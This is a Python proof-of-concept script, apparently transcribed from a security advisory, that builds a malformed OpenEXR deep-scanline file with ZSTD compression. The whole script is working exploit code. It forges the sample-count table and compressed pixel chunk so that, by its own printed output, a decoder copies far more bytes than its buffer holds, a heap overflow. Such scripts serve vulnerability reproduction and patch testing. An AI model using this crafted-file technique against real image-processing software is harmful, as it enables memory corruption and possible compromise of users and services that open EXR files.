#!/usr/bin/env python3
"""Craft the GHSA-98rx-qpfv-qcwv deep+ZSTD EXR from a valid baseline.

Transcribed from the advisory's inlined make_poc.py. The baseline is written
by gen_baseline.cpp: 64x1 deepscanline, one FLOAT channel Z, ZSTD compression.
The mutation stores the sample-count table raw and rebuilds the pixel chunk
as an EXR-ZSTD frame whose inner stream is u64(unpacked) || shuffle4(payload).
"""
import os
import struct
import subprocess
import sys
import tempfile

BASE = sys.argv[1] if len(sys.argv) > 1 else "baseline.exr"
OUT = sys.argv[2] if len(sys.argv) > 2 else "poc.exr"
S = int(sys.argv[3]) if len(sys.argv) > 3 else 1024
U = int(sys.argv[4]) if len(sys.argv) > 4 else 64

data = open(BASE, "rb").read()

p = 8


def cstr(b, i):
    j = b.index(b"\x00", i)
    return b[i:j].decode(), j + 1


while True:
    if data[p] == 0:
        p += 1
        break
    _, p = cstr(data, p)
    _, p = cstr(data, p)
    (sz,) = struct.unpack_from("<i", data, p)
    p += 4
    p += sz

hdr_end = p
(off0,) = struct.unpack_from("<Q", data, p)
otable_end = p + 8
assert off0 == otable_end, f"offset {off0} != {otable_end}"

q = off0
(y,) = struct.unpack_from("<i", data, q)
q += 4
st_sz, pk_sz, un_sz = struct.unpack_from("<qqq", data, q)
q += 24
print(f"baseline chunk: y={y} samptab={st_sz} packed={pk_sz} unpacked={un_sz}")

W, H = 64, 1
sampsize = W * H * 4
counts = [1] * (W - 1) + [S]
cum, tbl = 0, bytearray()
for c in counts:
    cum = max(cum, c)
    tbl += struct.pack("<I", cum)
tbl = bytes(tbl)
assert len(tbl) == sampsize
assert struct.unpack_from("<I", tbl, (W - 1) * 4)[0] == S


def shuffle4(b):
    n = len(b) // 4
    o = bytearray(len(b))
    for i in range(n):
        o[i] = b[i * 4 + 0]
        o[n + i] = b[i * 4 + 1]
        o[2 * n + i] = b[i * 4 + 2]
        o[3 * n + i] = b[i * 4 + 3]
    return bytes(o)


pixels = b"\x41" * U
inner = struct.pack("<Q", U) + shuffle4(pixels)
with tempfile.NamedTemporaryFile(delete=False) as tf:
    tf.write(inner)
    tmp = tf.name
payload = subprocess.run(["zstd", "-q", "-c", "-19", tmp],
                         capture_output=True, check=True).stdout
os.unlink(tmp)

MAGIC = 8248453963162350458
frame = (struct.pack("<Q", MAGIC) + struct.pack("<I", 1)
         + struct.pack("<I", 0) + struct.pack("<Q", len(payload)) + payload)
new_pk = len(frame)
assert new_pk != U, "packed==unpacked would take the memcpy fast path"

chunk = (struct.pack("<i", y) + struct.pack("<qqq", sampsize, new_pk, U)
         + tbl + frame)
out = data[:otable_end] + chunk
open(OUT, "wb").write(out)

grid_total = S * 4
print(f"poc: samptab={sampsize} (raw) packed={new_pk} unpacked={U}")
print(f"forged totsamp={S} combSampSize=4 GRID_TOTAL={grid_total}")
print(f"split=0 (all-float part) -> legacy split guard FALSE")
print(f"sort2 would memcpy {grid_total} bytes into a {U}-byte buffer "
      f"(overflow {grid_total - U} bytes)")
print(f"wrote {OUT} ({len(out)} bytes)")
